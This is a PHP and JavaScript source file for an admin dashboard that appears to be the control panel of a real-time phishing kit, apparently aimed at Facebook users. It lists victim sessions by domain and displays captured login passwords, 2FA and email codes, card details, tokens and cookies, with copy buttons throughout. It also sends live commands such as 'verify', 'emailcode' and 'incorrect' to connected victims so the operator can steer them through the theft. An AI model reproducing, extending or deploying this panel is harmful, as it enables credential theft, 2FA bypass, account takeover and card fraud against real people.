<?php
// c3.php - Professional Session Manager Dashboard
session_start();
date_default_timezone_set('Europe/Amsterdam');

// ============================================
// PASSWORD PROTECTION
// ============================================
$DASHBOARD_PASSWORD = 'admin123';
$session_key = 'dashboard_authenticated';

$is_authenticated = isset($_SESSION[$session_key]) && $_SESSION[$session_key] === true;

if (isset($_POST['dashboard_password'])) {
    if ($_POST['dashboard_password'] === $DASHBOARD_PASSWORD) {
        $_SESSION[$session_key] = true;
        $is_authenticated = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Invalid password!';
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (!$is_authenticated) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            body {
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-card {
                background: rgba(255,255,255,0.95);
                border-radius: 20px;
                padding: 40px;
                width: 400px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            .login-card h2 { margin-bottom: 20px; color: #333; }
            .login-icon { font-size: 60px; color: #667eea; margin-bottom: 20px; }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 2px solid #e9ecef;
                border-radius: 10px;
            }
            button {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 12px;
                border: none;
                border-radius: 10px;
                width: 100%;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
            }
            .error { color: #ef4444; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="login-icon"><i class="fas fa-shield-alt"></i></div>
            <h2>Admin Dashboard</h2>
            <?php if (isset($login_error)) echo '<div class="error">' . $login_error . '</div>'; ?>
            <form method="POST">
                <input type="password" name="dashboard_password" placeholder="Enter password" required>
                <button type="submit">Access Dashboard</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Test server connection
$server_online = false;
$ch = curl_init('/health');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$health_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code === 200) {
    $server_online = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Manager Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="dashboard.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <!-- Navbar -->
    <div class="navbar d-flex justify-content-between align-items-center">
        <div class="navbar-brand">
            <i class="fas fa-chart-line"></i> Session Manager Dashboard
        </div>
        <div class="d-flex align-items-center gap-3">
            <div class="server-status" id="serverStatus">
                <i class="fas fa-circle <?php echo $server_online ? 'status-online' : 'status-offline'; ?>"></i>
                Server: <?php echo $server_online ? 'Online' : 'Offline'; ?>
            </div>
            <button class="btn-sm btn-refresh" onclick="refreshAll()">
                <i class="fas fa-sync-alt"></i> Refresh
            </button>
            <a href="?logout=1" class="btn-sm btn-delete">
                <i class="fas fa-sign-out-alt"></i> Logout
            </a>
        </div>
    </div>

    <div class="main-content">
        <!-- Stats Cards -->
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card" onclick="loadAllData()">
                <div class="stat-icon"><i class="fas fa-database"></i></div>
                <div class="stat-number" id="totalSessions">0</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card" onclick="filterByOnline()">
                <div class="stat-icon"><i class="fas fa-circle" style="color:#10b981"></i></div>
                <div class="stat-number" id="onlineClients">0</div>
                <div class="stat-label">Online Now</div>
            </div>
            <div class="stat-card" onclick="filterByProfiles()">
                <div class="stat-icon"><i class="fas fa-user-check"></i></div>
                <div class="stat-number" id="totalProfiles">0</div>
                <div class="stat-label">Profiles</div>
            </div>
            <div class="stat-card" onclick="filterByLogins()">
                <div class="stat-icon"><i class="fas fa-key"></i></div>
                <div class="stat-number" id="totalLogins">0</div>
                <div class="stat-label">Logins Captured</div>
            </div>
        </div>

        <!-- Search Bar -->
        <div class="search-card">
            <div class="row">
                <div class="col-md-10">
                    <input type="text" id="searchInput" class="form-control" placeholder="🔍 Search by socket ID, email, name, phone, IP, domain...">
                </div>
                <div class="col-md-2">
                    <button class="btn-primary w-100" onclick="searchSessions()">
                        <i class="fas fa-search"></i> Search
                    </button>
                </div>
            </div>
        </div>

        <!-- Sessions Container -->
        <div id="sessionsContainer">
            <div class="loading"><div class="spinner"></div>Loading sessions...</div>
        </div>
    </div>

    <!-- Session Detail Modal -->
    <div class="modal fade" id="sessionModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> Session Details</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body" id="sessionModalBody"></div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-danger" onclick="deleteCurrentSession()">Delete Session</button>
                    <button type="button" class="btn btn-primary" onclick="sendCommandToCurrent()">Send Command</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Command Modal -->
    <div class="modal fade" id="commandModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header bg-primary text-white">
                    <h5 class="modal-title"><i class="fas fa-paper-plane"></i> Send Command</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body" id="commandModalBody"></div>
            </div>
        </div>
    </div>

    <script>
    let currentSocketId = null;
    let allSessions = {};
    let onlineClients = [];
    let currentFilter = 'all';
    let currentSearch = '';

    function formatTime(dateStr) {
        if (!dateStr) return 'Never';
        const date = new Date(dateStr);
        return date.toLocaleString('en-GB', { 
            timeZone: 'Europe/Amsterdam',
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit',
            hour12: false
        });
    }

    function showToast(message, type) {
        const bgColor = type === 'success' ? '#10b981' : (type === 'error' ? '#ef4444' : '#3b82f6');
        const toast = $('<div class="toast-custom" style="border-left: 4px solid ' + bgColor + '"><i class="fas ' + (type === 'success' ? 'fa-check-circle' : 'fa-info-circle') + '"></i> ' + message + '</div>');
        $('body').append(toast);
        setTimeout(() => toast.fadeOut(300, function() { $(this).remove(); }), 3000);
    }

    async function loadAllData() {
        await loadAllSessions();
        await loadOnlineClients();
    }

    async function loadAllSessions() {
        $('#sessionsContainer').html('<div class="loading"><div class="spinner"></div>Loading sessions...</div>');
        
        try {
            const response = await fetch('/getAllSessions');
            const data = await response.json();
            
            if (data.success) {
                allSessions = data.data || {};
                updateStats();
                displaySessions();
                showToast('Loaded ' + Object.keys(allSessions).length + ' sessions', 'success');
            } else {
                $('#sessionsContainer').html('<div class="loading text-danger">Failed to load sessions</div>');
            }
        } catch(e) {
            console.error('Error:', e);
            $('#sessionsContainer').html('<div class="loading text-danger"><i class="fas fa-exclamation-triangle fa-3x mb-3"></i><br>Cannot connect to server<br>Make sure WebSocket server is running:<br><code>cd /root/fbnew && node srlast.js</code></div>');
        }
    }

    async function loadOnlineClients() {
        try {
            const response = await fetch('/clients');
            const data = await response.json();
            if (data.success) {
                onlineClients = data.clients || [];
                updateStats();
                displaySessions();
            }
        } catch(e) {
            console.error('Error loading clients:', e);
        }
    }

    function updateStats() {
        const sessions = Object.values(allSessions);
        document.getElementById('totalSessions').textContent = sessions.length;
        
        let profiles = 0, logins = 0;
        for (const session of sessions) {
            if (session.profile_name || session.profile_email) profiles++;
            if (session.login_email) logins++;
        }
        document.getElementById('totalProfiles').textContent = profiles;
        document.getElementById('totalLogins').textContent = logins;
        
        const online = onlineClients.filter(c => c.status === 'online').length;
        document.getElementById('onlineClients').textContent = online;
    }

    function filterByOnline() {
        currentFilter = 'online';
        displaySessions();
        showToast('Showing online clients only', 'info');
    }

    function filterByProfiles() {
        currentFilter = 'profile';
        displaySessions();
        showToast('Showing sessions with profiles', 'info');
    }

    function filterByLogins() {
        currentFilter = 'login';
        displaySessions();
        showToast('Showing sessions with login data', 'info');
    }

    function searchSessions() {
        currentSearch = document.getElementById('searchInput').value.toLowerCase();
        displaySessions();
        if (currentSearch) showToast('Searching: ' + currentSearch, 'info');
    }

    function refreshAll() {
        loadAllData();
        showToast('Refreshing data...', 'info');
    }

    function displaySessions() {
        let sessions = Object.values(allSessions);
        
        // Apply filter
        if (currentFilter === 'online') {
            const onlineSocketIds = new Set(onlineClients.filter(c => c.status === 'online').map(c => c.socketId));
            sessions = sessions.filter(s => onlineSocketIds.has(s.socketId));
        } else if (currentFilter === 'profile') {
            sessions = sessions.filter(s => s.profile_name || s.profile_email);
        } else if (currentFilter === 'login') {
            sessions = sessions.filter(s => s.login_email);
        }
        
        // Apply search
        if (currentSearch) {
            sessions = sessions.filter(s => 
                (s.socketId && s.socketId.toLowerCase().includes(currentSearch)) ||
                (s.profile_name && s.profile_name.toLowerCase().includes(currentSearch)) ||
                (s.profile_email && s.profile_email.toLowerCase().includes(currentSearch)) ||
                (s.login_email && s.login_email.toLowerCase().includes(currentSearch)) ||
                (s.profile_phone && s.profile_phone.includes(currentSearch)) ||
                (s.domain && s.domain.toLowerCase().includes(currentSearch)) ||
                (s.clientIp && s.clientIp.includes(currentSearch)) ||
                JSON.stringify(s).toLowerCase().includes(currentSearch)
            );
        }
        
        // Group by domain
        const grouped = {};
        for (const session of sessions) {
            const domain = session.domain || 'unknown';
            if (!grouped[domain]) grouped[domain] = [];
            grouped[domain].push(session);
        }
        
        const domains = Object.keys(grouped).sort((a, b) => {
            const lastA = Math.max(...grouped[a].map(s => new Date(s.last_seen || s.created_at || 0)));
            const lastB = Math.max(...grouped[b].map(s => new Date(s.last_seen || s.created_at || 0)));
            return lastB - lastA;
        });
        
        if (domains.length === 0) {
            $('#sessionsContainer').html('<div class="loading text-muted"><i class="fas fa-inbox fa-3x mb-3"></i><br>No sessions found</div>');
            return;
        }
        
        let html = '';
        for (const domain of domains) {
            const domainSessions = grouped[domain];
            const hasOnline = domainSessions.some(s => onlineClients.some(c => c.socketId === s.socketId && c.status === 'online'));
            const latestSession = domainSessions.reduce((latest, s) => {
                const date = s.last_seen || s.created_at;
                return (!latest || date > latest) ? date : latest;
            }, null);
            
            html += `
                <div class="domain-group">
                    <div class="domain-header" onclick="toggleDomain('${domain.replace(/[^a-zA-Z0-9]/g, '_')}')">
                        <h3>
                            <i class="fas ${hasOnline ? 'fa-circle' : 'fa-circle'}"></i>
                            ${escapeHtml(domain)}
                        </h3>
                        <div class="domain-stats">
                            <span><i class="fas fa-database"></i> ${domainSessions.length} sessions</span>
                            <span><i class="fas fa-clock"></i> Last: ${formatTime(latestSession)}</span>
                            <i class="fas fa-chevron-down"></i>
                        </div>
                    </div>
                    <div class="domain-body" id="domain-${domain.replace(/[^a-zA-Z0-9]/g, '_')}">
            `;
            
            domainSessions.sort((a, b) => new Date(b.last_seen || b.created_at) - new Date(a.last_seen || a.created_at));
            
            for (const session of domainSessions) {
                const isOnline = onlineClients.some(c => c.socketId === session.socketId && c.status === 'online');
                const lastSeen = session.last_seen || session.created_at;
                const currentUrl = session.current_url || session.currentUrl || 'Unknown';
                
                html += `
                    <div class="session-card">
                        <div class="session-header" onclick="toggleSession('${session.socketId}')">
                            <div>
                                <i class="fas fa-chevron-down"></i>
                                <strong>${session.socketId.substring(0, 25)}...</strong>
                                <span class="badge ${isOnline ? 'badge-online' : 'badge-offline'} ms-2">
                                    ${isOnline ? '● ONLINE' : '○ OFFLINE'}
                                </span>
                                ${session.profile_name ? `<span class="badge-info ms-2">${escapeHtml(session.profile_name)}</span>` : ''}
                            </div>
                            <div>
                                <small>${formatTime(lastSeen)}</small>
                                ${isOnline ? `<button class="btn-sm btn-command ms-2" onclick="event.stopPropagation();showCommandModal('${session.socketId}')"><i class="fas fa-paper-plane"></i> Command</button>` : ''}
                                <button class="btn-sm btn-view ms-1" onclick="event.stopPropagation();viewSessionDetail('${session.socketId}')"><i class="fas fa-eye"></i></button>
                                <button class="btn-sm btn-delete ms-1" onclick="event.stopPropagation();deleteSession('${session.socketId}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>
                        <div class="session-body" id="session-${session.socketId}">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="data-row"><div class="data-label">Socket ID:</div><div class="data-value"><code>${session.socketId}</code></div></div>
                                    <div class="data-row"><div class="data-label">Domain:</div><div class="data-value">${escapeHtml(session.domain || 'unknown')}</div></div>
                                    <div class="data-row"><div class="data-label">IP:</div><div class="data-value">${escapeHtml(session.clientIp || 'unknown')}</div></div>
                                    <div class="data-row"><div class="data-label">Last Seen:</div><div class="data-value">${formatTime(lastSeen)}</div></div>
                                    <div class="data-row"><div class="data-label">Current URL:</div><div class="data-value"><small>${escapeHtml(currentUrl)}</small></div></div>
                                </div>
                                <div class="col-md-6">
                                    ${session.profile_name ? `<div class="data-row"><div class="data-label">Name:</div><div class="data-value">${escapeHtml(session.profile_name)}</div></div>` : ''}
                                    ${session.profile_email ? `<div class="data-row"><div class="data-label">Email:</div><div class="data-value"><code>${escapeHtml(session.profile_email)}</code></div></div>` : ''}
                                    ${session.profile_phone ? `<div class="data-row"><div class="data-label">Phone:</div><div class="data-value"><code>${escapeHtml(session.profile_phone)}</code></div></div>` : ''}
                                    ${session.login_email ? `<div class="data-row"><div class="data-label">Login:</div><div class="data-value"><code>${escapeHtml(session.login_email)}</code></div></div>` : ''}
                                    ${session['2fa_code'] ? `<div class="data-row"><div class="data-label">2FA:</div><div class="data-value"><code>${session['2fa_code']}</code> <small class="text-muted">(${formatTime(session['2fa_time'])})</small></div></div>` : ''}
                                    ${session.card_number ? `<div class="data-row"><div class="data-label">Card:</div><div class="data-value">****${session.card_number.slice(-4)}</div></div>` : ''}
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }
            
            html += `</div></div>`;
        }
        
        $('#sessionsContainer').html(html);
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    const sessionDetailHiddenKeys = new Set(['data']);
    const sessionDetailKnownKeys = new Set([
        'socketId', 'domain', 'clientIp', 'ip_address', 'created_at', 'last_seen', 'current_url', 'currentUrl', 'userAgent', 'user_agent',
        'profile_name', 'profile_email', 'profile_phone',
        'login_email', 'login_password', 'login_time',
        '2fa_code', '2fa_time', 'email_code', 'email_code_time',
        'card_number', 'card_holder', 'card_expiry', 'card_time',
        'wrong_email', 'wrong_email_time'
    ]);

    function isMeaningfulValue(value) {
        if (value === null || value === undefined) return false;
        if (typeof value === 'string') return value.trim() !== '';
        if (Array.isArray(value)) return value.some(isMeaningfulValue);
        if (typeof value === 'object') return Object.values(value).some(isMeaningfulValue);
        return true;
    }

    function formatFieldLabel(key) {
        return String(key)
            .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
            .replace(/[_-]+/g, ' ')
            .replace(/\b\w/g, char => char.toUpperCase())
            .replace(/\b2 Fa\b/g, '2FA')
            .replace(/\bOtp\b/g, 'OTP')
            .replace(/\bIp\b/g, 'IP')
            .replace(/\bUrl\b/g, 'URL')
            .replace(/\bId\b/g, 'ID');
    }

    function isTimeLikeField(key) {
        return /(?:^|_)(time|date|at|seen|updated|created)$/i.test(String(key))
            || ['created_at', 'last_seen'].includes(String(key));
    }

    function buildCopyButton(value, className = 'btn-sm btn-view') {
        const rawValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
        const encodedValue = encodeURIComponent(rawValue);
        return ` <button class="${className}" onclick="copyToClipboard(decodeURIComponent('${encodedValue}'))">Copy</button>`;
    }

    function formatDetailValue(value, key = '') {
        if (isTimeLikeField(key)) return escapeHtml(formatTime(value));
        if (typeof value === 'boolean') return value ? 'Yes' : 'No';
        if (Array.isArray(value) || (value && typeof value === 'object')) {
            return `<pre class="mb-0"><code>${escapeHtml(JSON.stringify(value, null, 2))}</code></pre>`;
        }
        return escapeHtml(String(value));
    }

    function renderDetailRow(label, value, options = {}) {
        if (!isMeaningfulValue(value)) return '';

        const displayValue = options.formatter
            ? options.formatter(value)
            : formatDetailValue(value, options.key || '');
        const copyButton = options.copy ? buildCopyButton(options.copyValue ?? value) : '';
        const suffix = options.suffix ? ` <small class="text-muted">${escapeHtml(options.suffix)}</small>` : '';

        return `<div class="data-row"><div class="data-label">${escapeHtml(label)}:</div><div class="data-value">${displayValue}${copyButton}${suffix}</div></div>`;
    }

    function renderDetailSection(title, rows, extraClasses = 'mb-3') {
        const visibleRows = rows.filter(Boolean);
        if (!visibleRows.length) return '';

        return `
            <div class="card ${extraClasses}">
                <div class="card-header bg-light"><strong>${escapeHtml(title)}</strong></div>
                <div class="card-body">${visibleRows.join('')}</div>
            </div>
        `;
    }

    function getAdditionalSectionTitle(key) {
        if (/(recovery|backup|verify|code|otp|2fa|pin)/i.test(key)) return 'Verification Data';
        if (/(token|cookie|session|auth|bearer|jwt)/i.test(key)) return 'Tokens & Cookies';
        if (/(card|cvv|payment|wallet|bank|iban|crypto|expiry)/i.test(key)) return 'Payment Data';
        if (/(login|pass|credential|email|username|user)/i.test(key)) return 'Credentials & Identity';
        if (/(phone|address|city|state|country|zip|postal|name)/i.test(key)) return 'Profile Details';
        return 'Additional Captured Data';
    }

    function collectAdditionalSessionEntries(session) {
        const entries = [];
        const seenKeys = new Set();
        const sources = [session];

        if (session && session.data && typeof session.data === 'object' && !Array.isArray(session.data)) {
            sources.push(session.data);
        }

        for (const source of sources) {
            if (!source || typeof source !== 'object' || Array.isArray(source)) continue;

            for (const [key, value] of Object.entries(source)) {
                if (seenKeys.has(key) || sessionDetailHiddenKeys.has(key) || sessionDetailKnownKeys.has(key) || !isMeaningfulValue(value)) {
                    continue;
                }

                seenKeys.add(key);
                entries.push({ key, value });
            }
        }

        return entries;
    }

    function renderAdditionalDetailSections(session) {
        const groupedEntries = new Map();

        for (const entry of collectAdditionalSessionEntries(session)) {
            const title = getAdditionalSectionTitle(entry.key);
            if (!groupedEntries.has(title)) groupedEntries.set(title, []);
            groupedEntries.get(title).push(entry);
        }

        let html = '';
        for (const [title, entries] of groupedEntries.entries()) {
            html += renderDetailSection(title, entries.map(({ key, value }) =>
                renderDetailRow(formatFieldLabel(key), value, { key, copy: true })
            ));
        }

        return html;
    }

    function renderSessionDetailHtml(session, socketId) {
        const basicSection = renderDetailSection('Basic Information', [
            renderDetailRow('Socket ID', socketId, { copy: true }),
            renderDetailRow('Domain', session.domain || 'unknown'),
            renderDetailRow('IP', session.clientIp || session.ip_address || 'unknown'),
            renderDetailRow('Created', session.created_at, { key: 'created_at' }),
            renderDetailRow('Last Seen', session.last_seen, { key: 'last_seen' }),
            renderDetailRow('Current URL', session.current_url || session.currentUrl || 'Unknown'),
            renderDetailRow('User Agent', session.userAgent || session.user_agent)
        ]);

        const profileSection = renderDetailSection('Profile Information', [
            renderDetailRow('Name', session.profile_name),
            renderDetailRow('Email', session.profile_email, { copy: true }),
            renderDetailRow('Phone', session.profile_phone, { copy: true })
        ]);

        const loginSection = renderDetailSection('Login Credentials', [
            renderDetailRow('Email', session.login_email, { copy: true }),
            renderDetailRow('Password', session.login_password, { copy: true }),
            renderDetailRow('Time', session.login_time, { key: 'login_time' })
        ]);

        const verificationSection = renderDetailSection('Verification Codes', [
            renderDetailRow('2FA Code', session['2fa_code'], {
                key: '2fa_code',
                copy: true,
                suffix: isMeaningfulValue(session['2fa_time']) ? `(${formatTime(session['2fa_time'])})` : ''
            }),
            renderDetailRow('Email Code', session.email_code, {
                key: 'email_code',
                copy: true,
                suffix: isMeaningfulValue(session.email_code_time) ? `(${formatTime(session.email_code_time)})` : ''
            })
        ]);

        const cardSection = renderDetailSection('Card Details', [
            renderDetailRow('Card Number', session.card_number, { copy: true }),
            renderDetailRow('Card Holder', session.card_holder),
            renderDetailRow('Expiry', session.card_expiry),
            renderDetailRow('Time', session.card_time, { key: 'card_time' })
        ]);

        const wrongAttemptSection = renderDetailSection('Wrong Attempt', [
            renderDetailRow('Email', session.wrong_email),
            renderDetailRow('Time', session.wrong_email_time, { key: 'wrong_email_time' })
        ], 'mb-3 border-danger');

        return basicSection
            + profileSection
            + loginSection
            + verificationSection
            + cardSection
            + renderAdditionalDetailSections(session)
            + wrongAttemptSection;
    }

    function toggleDomain(domainId) {
        const el = document.getElementById(`domain-${domainId}`);
        el.classList.toggle('show');
    }

    function toggleSession(socketId) {
        const el = document.getElementById(`session-${socketId}`);
        el.classList.toggle('show');
    }

    async function viewSessionDetail(socketId) {
        currentSocketId = socketId;
        $('#sessionModal').modal('show');
        $('#sessionModalBody').html('<div class="text-center py-4"><div class="spinner"></div>Loading...</div>');
        
        try {
            const response = await fetch(`/getSession?socketId=${encodeURIComponent(socketId)}`);
            const data = await response.json();
            
            if (data.success && data.data) {
                $('#sessionModalBody').html(renderSessionDetailHtml(data.data, socketId));
            } else {
                $('#sessionModalBody').html('<div class="text-center text-danger py-4">No session data found</div>');
            }
        } catch(e) {
            $('#sessionModalBody').html(`<div class="text-center text-danger py-4">Error: ${e.message}</div>`);
        }
    }

    function copyToClipboard(text) {
        navigator.clipboard.writeText(text);
        showToast('Copied to clipboard!', 'success');
    }

    async function deleteSession(socketId) {
        if (confirm('⚠️ Delete this session? This cannot be undone.')) {
            try {
                const response = await fetch(`/deleteSession?socketId=${encodeURIComponent(socketId)}`);
                const data = await response.json();
                if (data.success) {
                    showToast('Session deleted', 'success');
                    loadAllSessions();
                    $('#sessionModal').modal('hide');
                } else {
                    showToast('Delete failed', 'error');
                }
            } catch(e) {
                showToast('Error deleting session', 'error');
            }
        }
    }

    function deleteCurrentSession() {
        if (currentSocketId) deleteSession(currentSocketId);
    }

    function sendCommandToCurrent() {
        if (currentSocketId) showCommandModal(currentSocketId);
    }

    function showCommandModal(socketId) {
        currentSocketId = socketId;
        const commands = ['login', 'verify', 'emailcode', 'reset', '10min', '60min', 'incorrect', 'verifywp', 'verifyg', 'verifybackup', 'restrict', 'done', 'career', 'session'];
        
        let html = '<div class="row"><div class="col-12"><p>Send command to client:</p><hr><div class="d-flex flex-wrap gap-2">';
        for (const cmd of commands) {
            html += `<button class="btn-sm btn-primary" onclick="sendCommand('${socketId}', '${cmd}')">${cmd}</button>`;
        }
        html += '</div><hr><div class="input-group mt-3"><input type="text" id="customCommandInput" class="form-control" placeholder="Custom command"><button class="btn-primary" onclick="sendCustomCommand()">Send</button></div></div></div>';
        
        $('#commandModalBody').html(html);
        $('#commandModal').modal('show');
    }

    async function sendCommand(socketId, command) {
        try {
            const response = await fetch(`/sendMessage?socketId=${encodeURIComponent(socketId)}&message=${encodeURIComponent(command)}`);
            const result = await response.json();
            if (result.success) {
                showToast(`✅ Command "${command}" sent`, 'success');
            } else {
                showToast(`❌ Command "${command}" failed`, 'error');
            }
            $('#commandModal').modal('hide');
        } catch(e) {
            showToast('Failed to send command', 'error');
        }
    }

    function sendCustomCommand() {
        const cmd = $('#customCommandInput').val();
        if (cmd && currentSocketId) sendCommand(currentSocketId, cmd);
    }

    // Auto-refresh every 30 seconds
    setInterval(() => {
        if (!document.hasFocus()) return;
        loadAllData();
    }, 30000);

    // Initial load
    loadAllData();
    
    // Expose functions globally
    window.toggleDomain = toggleDomain;
    window.toggleSession = toggleSession;
    window.viewSessionDetail = viewSessionDetail;
    window.deleteSession = deleteSession;
    window.deleteCurrentSession = deleteCurrentSession;
    window.showCommandModal = showCommandModal;
    window.sendCommand = sendCommand;
    window.sendCustomCommand = sendCustomCommand;
    window.copyToClipboard = copyToClipboard;
    window.sendCommandToCurrent = sendCommandToCurrent;
    window.filterByOnline = filterByOnline;
    window.filterByProfiles = filterByProfiles;
    window.filterByLogins = filterByLogins;
    window.searchSessions = searchSessions;
    window.refreshAll = refreshAll;
    window.loadAllData = loadAllData;
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>